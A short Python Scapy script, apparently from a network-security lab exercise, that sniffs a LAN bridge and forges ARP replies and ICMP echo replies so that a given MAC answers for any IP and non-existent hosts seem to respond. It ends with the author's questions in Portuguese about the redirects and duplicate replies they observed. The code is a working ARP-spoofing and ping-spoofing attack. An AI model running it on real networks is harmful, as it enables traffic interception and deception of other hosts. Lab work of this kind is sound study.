from scapy.all import *
import threading

# Assuming 10.9.0.0/24 is our network.

# ping 1.2.3.4 # a non-existing host on the Internet
# ping 10.9.0.99 # a non-existing host on the LAN
# ping 8.8.8.8 # an existing host on the Internet

attackerMAC = '02:42:fa:c0:10:3c'
interface = 'br-508fde78569d'

def spoof_arp_pkt(pkt):
    if(pkt[Ether].dst == 'ff:ff:ff:ff:ff:ff'):
        pkt[Ether].dst = pkt[Ether].src
        pkt[Ether].src = attackerMAC

        pkt[ARP].op = 2 # is-at

        srcMAC = pkt[ARP].hwsrc
        srcIP = pkt[ARP].psrc
        
        pkt[ARP].hwsrc = attackerMAC
        pkt[ARP].psrc = pkt[ARP].pdst
        pkt[ARP].pdst = srcIP
        pkt[ARP].hwdst = srcMAC

        del pkt[ARP].plen
        del pkt[ARP].hwlen

        sendp(pkt, iface=interface)

def spoof_icmp_pkt(pkt):
    if(pkt[Ether].src != attackerMAC):             
        pkt[Ether].dst = pkt[Ether].src
        pkt[Ether].src = attackerMAC
 
        pkt[ICMP].type = 0 # echo-reply

        srcIP = pkt[IP].src
        pkt[IP].src = pkt[IP].dst
        pkt[IP].dst = srcIP
        # pkt[Raw].load = "test" # This causes packets to be discarded.

        del pkt[ICMP].chksum
        del pkt[IP].chksum
        del pkt[IP].len

        sendp(pkt, iface=interface)

x = threading.Thread(target=lambda: sniff(iface=interface, filter='arp', prn=spoof_arp_pkt))
x.start()

y = threading.Thread(target=lambda: sniff(iface=interface, filter='icmp', prn=spoof_icmp_pkt))
y.start()

# Dúvidas
# - Ao fazer ping 10.9.0.99 são recebidos vários Redirects.
# - Ao fazer ping para 8.8.8.8 são recebidos vários Dups.
# - Ao fazer ping para 1.2.3.4, funciona como um ping normal, porquê?